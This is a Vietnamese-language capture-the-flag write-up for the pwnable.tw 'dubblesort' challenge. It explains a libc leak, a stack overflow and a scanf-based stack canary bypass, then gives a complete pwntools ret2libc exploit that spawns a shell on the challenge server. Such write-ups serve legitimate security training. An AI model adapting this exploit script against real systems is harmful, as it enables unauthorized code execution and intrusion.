# Dubblesort \[200pts\] (pwnable.tw)



> Sort the memory!
>
> `nc chall.pwnable.tw 10101`
>
> [dubblesort](https://github.com/th3-5had0w/writeups/raw/main/dubblesort%5Bpwnable.tw%5D/dubblesort)
>
> [libc.so](https://github.com/th3-5had0w/writeups/raw/main/dubblesort%5Bpwnable.tw%5D/libc_32.so.6)

[Phiên bản libc local (Ubuntu 20.04)](https://github.com/th3-5had0w/writeups/raw/main/dubblesort%5Bpwnable.tw%5D/local_libc.so.6)

## Những đoạn code cần lưu ý

### 1) Leak libc

![pic1](https://github.com/th3-5had0w/writeups/blob/main/dubblesort%5Bpwnable.tw%5D/res/pic_1.png)

#### Ở đây chương trình đọc input vào nhưng không chặn chuỗi bằng nullbyte (`\x00`) => Ta có thể nhập các kí tự để hàm printf leak được địa chỉ của libc.

![pic3](https://github.com/th3-5had0w/writeups/blob/main/dubblesort%5Bpwnable.tw%5D/res/pic_3.png)

#### Mình đã nhập 8 chữ `a` kèm theo kí tự enter `\x0a`, và như ảnh trên thì có thể thấy địa chỉ chỉ libc rất gần với nơi ta nhập input. (1)
#### Ngoài ra kí tự enter của mình đã ghi đè lên byte nullbyte (`\x00`) của libc, mà printf sẽ in các bytes ra màn hình cho đến khi gặp kí tự nullbyte (`\x00`), vì kí tự enter của mình đã ghi đè lên 1 byte `\x00` của địa chỉ libc nên khi leak được bạn nhớ trừ đi `\x0a` (2)

#### Từ (1) và (2) => Ta có thể leak được libc.

#### Nhưng đây mới chỉ là địa chỉ libc nằm tại segment `.got.plt` đã được map, để tìm địa chỉ libc gốc thì ta phải lấy địa chỉ vừa leak được trừ đi địa chỉ chưa được map.

![pic7](https://github.com/th3-5had0w/writeups/blob/main/dubblesort%5Bpwnable.tw%5D/res/pic_7.png)

#### Ở đây address là 0x001eb000 vì mình đang readelf libc local của mình, có thể address ở libc bạn sẽ khác và address ở libc của remote server cũng sẽ khác.

```
địa chỉ libc gốc = địa chỉ libc đã leak - 0x001eb000 - 0x0a
```

### 2) Lỗi tràn bộ nhớ tại đoạn code nhập số lượng số mà ta muốn nhập vào

![pic2](https://github.com/th3-5had0w/writeups/blob/main/dubblesort%5Bpwnable.tw%5D/res/pic_2.png)

#### Ở đây v4 chính là con trỏ của v13, chương trình sẽ hỏi ta muốn nhập bao nhiêu số, sau mỗi một số nhập vào thì v4 sẽ tăng lên 1, có nghĩa là `vị trí của con trỏ tăng lên 4` vì kích cỡ của kiểu `int`, nhưng ở đây ta không hề thấy có một hàm hay dòng lệnh nào để kiểm tra => Khi tăng vị trí của con trỏ lên một kích cỡ nhất định (4\*n) thì ta sẽ gặp lỗi buffer overflow!

![pic4](https://github.com/th3-5had0w/writeups/blob/main/dubblesort%5Bpwnable.tw%5D/res/pic_4.png)

#### Nhưng ta gặp vấn đề là chương trình này có bật cơ chế `Stack Canary`.

![pic5](https://github.com/th3-5had0w/writeups/blob/main/dubblesort%5Bpwnable.tw%5D/res/pic_5.png)

#### Vì chương trình đọc input các số vào bằng hàm `scanf` nên ta có thể bypass dễ dàng bằng cách nhập một kí tự không phải là số vào ô dữ liệu nơi chứa `Stack Canary`, cụ thể ở đây là ở số thứ 25.

![pic6](https://github.com/th3-5had0w/writeups/blob/main/dubblesort%5Bpwnable.tw%5D/res/pic_5.png)

#### Như trên hình thì không hề có cảnh báo `*** stack smashing detected ***`, vậy là ta đã bypass được `Stack Canary`.

### 3) Kết luận

#### Vậy là ta đã leak được libc và bypass được `Stack Canary` để điều khiển con trỏ `RIP`.

#### Đây là chương trình chạy kiến trúc x86 nên theo calling convention của nó ta sẽ truyền vào `RIP` theo thứ tự:

```
[RIP] = địa chỉ của hàm system
[RIP+4] = tùy ý (đây là return pointer của hàm system, sau hàm system thì ta không cần return về đâu nữa vì đã có shell)
[RIP+8] = địa chỉ của chuỗi /bin/sh (đây chính là tham số đầu tiên của hàm system)
```

#### Ta cũng cần lưu ý về cơ chế sort của chương trình để tránh giá trị của canary bị sửa đổi ngoài ý muốn.

#### Nhưng ở đây thì canary, địa chỉ của hàm system và địa chỉ của chuỗi /bin/sh đã được nhập vào theo thứ tự từ nhỏ đến lớn ngay từ đầu.

#### Vậy là ta đã exploit thành công chương trình. Đây là code exploit của mình:
```python
from pwn import *

debug = False

if (debug):
    io = process('./dubblesort')
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    offset = 0x001eb000
else:
    io = remote('chall.pwnable.tw', 10101)
    libc = ELF('libc_32.so.6')
    offset = 0x001b0000

print(io.recv())

# ----- leak libc ở local và ở remote vì phiên bản libc khác nhau -----

if (debug):
    io.sendline(b'aaaaaaaa')
    print('trash: ', io.recv(14))
else:
    io.sendline(b'aaaaaaaaaaaaaaaaaaaaaaaa')
    print('trash: ', io.recv(30))
info = io.recv(4)
print('raw: ', info)
virtual_libc = u32(info)-0xa
print('leaked: ', hex(virtual_libc))
print('trash: ', io.recv())
libc.address = virtual_libc - offset
print('base libc addr: ', hex(libc.address))
print('system: ', hex(libc.sym['system']))
print('bin/sh: ', hex(next(libc.search(b'/bin/sh'))))

# ---------------------------------------------------------------------

io.sendline(b'35')
for i in range(24):
    print(io.recv())
    io.sendline(b'0')

# ----- bypassing stack canary -----

print(io.recv())
io.sendline(b'-')

# ----------------------------------

for i in range(32-25):
    print(io.recv())
    io.sendline(str(libc.sym['system']))

# ----- điều khiển con trỏ RIP theo calling convention của cấu trúc x86 system_address -> return_address -> argument -----

print(io.recv())
print('New RIP value: ', libc.sym['system'])
io.sendline(str(libc.sym['system']))

print(io.recv())
print('Sending /bin/sh: ', next(libc.search(b'/bin/sh')))
io.sendline(str(next(libc.search(b'/bin/sh'))))
print(io.recv())
print('Sending /bin/sh: ', next(libc.search(b'/bin/sh')))
io.sendline(str(next(libc.search(b'/bin/sh'))))

# ------------------------------------------------------------------------------------------------------------------------

print(io.recv())
io.interactive()
```
